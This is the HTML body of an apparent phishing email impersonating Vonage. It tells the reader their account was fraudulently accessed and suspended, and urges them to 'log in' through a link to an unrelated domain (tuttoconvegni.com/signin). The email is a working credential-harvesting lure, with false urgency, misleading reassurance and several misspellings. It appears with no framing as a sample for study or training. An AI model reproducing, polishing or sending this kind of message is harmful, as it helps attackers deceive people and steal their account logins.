  <font color="FF9933" size=4>Dear Vonage Member,<br></font>
<br>
&nbsp;We have reason to belive that your Vonage Account has been fraudulently accessed by a third party using other ISP(Internet Service Provider).<br>
<br>
&nbsp;This might have happened due to the following reasons:<br>
- You accessed your account from a different computer or you have changed your Operating System.<br>
- You have dynamic IP address and due to that our system might have interpretated it as a hacking attempt.<br>
- You entered a wrong password 3 times when you tried to connect to your Vonage Account.<br>
<br>
<br>
&nbsp;Please understand that your account is safe but is currently <font color="FF9933"><b>suspended</b></font>.<br><br>
&nbsp;This suspension can be easily removed by logging in, by <a href="http://tuttoconvegni.com/signin"><strong><font color="FF9933">clicking here</font></a></strong> or the link below:<br>

<br>
<br>
*We will check your IP address, time zone, and if all matches, your account was never fraudulently accessed.<br>
<br>
